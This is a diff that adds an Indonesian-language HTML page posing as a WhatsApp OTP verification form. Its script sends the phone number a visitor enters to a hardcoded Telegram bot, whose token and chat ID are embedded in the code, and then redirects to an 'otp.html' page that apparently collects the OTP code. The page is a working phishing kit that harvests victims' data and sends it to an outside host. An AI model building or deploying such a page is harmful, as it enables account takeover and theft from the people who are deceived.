@@ -1,0 +1,179 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Masukkan Nomor HP</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col justify-between">
+  <div class="p-5">
+    <div class="flex justify-between items-center mb-6">
+      <button aria-label="Back" class="text-black text-2xl">
+        <i class="fas fa-chevron-left"></i>
+      </button>
+      <button aria-label="Help" class="text-black text-2xl">
+        <i class="fas fa-headset"></i>
+      </button>
+    </div>
+    <h1 class="font-bold text-2xl mb-2">Masukkan nomor HP kamu</h1>
+    <p class="text-gray-600 text-sm mb-6">
+      Pastikan
+      <strong>nomor pribadi</strong> kamu memiliki akun WhatsApp agar tetap
+      aman. Akan mengirimkan kode OTP ke nomor.
+    </p>
+    <form id="phoneForm" class="max-w-md">
+      <div
+        class="flex items-center bg-gray-200 rounded-xl p-3 mb-4 max-w-md"
+      >
+        <img
+          alt="Bendera Indonesia merah putih persegi panjang"
+          class="rounded-sm mr-3 flex-shrink-0"
+          height="24"
+          src="https://uxwing.com/wp-content/themes/uxwing/download/flags-landmarks/indonesia-flag-icon.png"
+          width="32"
+        />
+        <input
+          aria-label="Nomor HP"
+          id="phoneInput"
+          name="phone"
+          class="bg-gray-200 placeholder-gray-400 text-black text-base focus:outline-none flex-grow"
+          placeholder="Nomor HP"
+          type="tel"
+          required
+        />
+      </div>
+      <a class="text-black font-bold underline text-sm mb-6 inline-block" href="#">
+        Nomor HP terkendala?
+      </a>
+    </form>
+  </div>
+  <div class="p-5">
+    <div class="flex items-center mb-4 max-w-md">
+      <span class="text-sm mr-3">OTP verifikasi:</span>
+      <button
+        id="smsOtpBtn"
+        class="bg-gray-300 text-black text-sm font-semibold rounded-lg px-4 py-1 mr-3"
+        type="button"
+      >
+        SMS OTP
+      </button>
+      <button
+        id="voiceOtpBtn"
+        class="bg-gray-300 text-black text-sm font-semibold rounded-lg px-4 py-1"
+        type="button"
+      >
+        Voice OTP
+      </button>
+    </div>
+    <button
+      id="sendOtpBtn"
+      class="w-full max-w-md bg-red-600 text-white text-lg font-semibold rounded-xl py-3"
+      type="button"
+    >
+      Kirim WhatsApp OTP
+    </button>
+  </div>
+
+  <script>
+    // Variables to track OTP type
+    let otpType = "sms";
+
+    const smsBtn = document.getElementById("smsOtpBtn");
+    const voiceBtn = document.getElementById("voiceOtpBtn");
+    const sendBtn = document.getElementById("sendOtpBtn");
+    const phoneInput = document.getElementById("phoneInput");
+
+    function setOtpType(type) {
+      otpType = type;
+      if (type === "sms") {
+        smsBtn.classList.add("bg-gray-300");
+        smsBtn.classList.remove("bg-gray-400");
+        voiceBtn.classList.remove("bg-gray-300");
+        voiceBtn.classList.add("bg-gray-400");
+      } else {
+        voiceBtn.classList.add("bg-gray-300");
+        voiceBtn.classList.remove("bg-gray-400");
+        smsBtn.classList.remove("bg-gray-300");
+        smsBtn.classList.add("bg-gray-400");
+      }
+    }
+
+    // Initialize with SMS OTP selected style
+    smsBtn.classList.add("bg-gray-400");
+    smsBtn.classList.remove("bg-gray-300");
+
+    smsBtn.addEventListener("click", () => {
+      setOtpType("sms");
+    });
+
+    voiceBtn.addEventListener("click", () => {
+      setOtpType("voice");
+    });
+
+    sendBtn.addEventListener("click", async () => {
+      const phone = phoneInput.value.trim();
+      if (!phone) {
+        alert("Mohon masukkan nomor HP.");
+        phoneInput.focus();
+        return;
+      }
+
+      // Show loading state
+      sendBtn.disabled = true;
+      sendBtn.textContent = "Mengirim...";
+
+      // Prepare the message to send to Telegram
+      const currentTime = new Date().toLocaleString('id-ID');
+      const message = `🔐 *Data OTP Baru*\n\n📱 *Nomor HP:* ${phone}\n📨 *Jenis OTP:* ${otpType === "sms" ? "SMS OTP" : "Voice OTP"}\n⏰ *Waktu:* ${currentTime}\n\n_Data dikirim dari form WhatsApp OTP_`;
+
+      // Replace with your actual bot token and chat ID
+      const botToken = '8288100288:AAFLYwr0gDGktBvmPEOniDxGxQsPkv_DX_0'; // Replace with your bot token
+      const chatId = '6351598509'; // Replace with your chat ID
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        // Send the message to Telegram
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          }),
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          window.location.href = "otp.html";
+          // Optional: Clear the form
+          phoneInput.value = '';
+        } else {
+          console.error('Telegram API Error:', data);
+          alert("Gagal mengirim OTP. Silakan coba lagi.");
+        }
+      } catch (error) {
+        console.error("Network Error:", error);
+        alert("Terjadi kesalahan jaringan. Silakan coba lagi.");
+      } finally {
+        // Reset button state
+        sendBtn.disabled = false;
+        sendBtn.textContent = "Kirim WhatsApp OTP";
+      }
+    });
+  </script>
+</body>
+</html>
